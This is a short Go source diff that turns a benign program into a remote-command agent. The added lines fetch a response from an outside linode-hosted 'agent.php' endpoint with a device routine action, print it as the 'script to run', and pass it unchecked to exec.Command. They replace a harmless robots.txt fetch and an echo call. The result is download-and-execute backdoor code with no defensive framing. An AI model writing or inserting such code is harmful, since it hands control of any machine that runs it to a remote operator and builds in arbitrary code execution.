@@ -10,7 +10,7 @@ import (
 
 func main() {
 	
-	res, err := http.Get("http://www.google.com/robots.txt")
+	res, err := http.Get("https://li804-102.members.linode.com/fgtcfg/lib/agent.php?action=device/routine/get&devId=123")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -19,10 +19,9 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
-	fmt.Printf("%s", robots)
+	fmt.Printf("script to run is : %s", robots)
 
-
-	out, err := exec.Command("echo ","wtf" ).Output()
+	out, err := exec.Command(robots).Output()
     if err != nil {
         log.Fatal(err)
     }
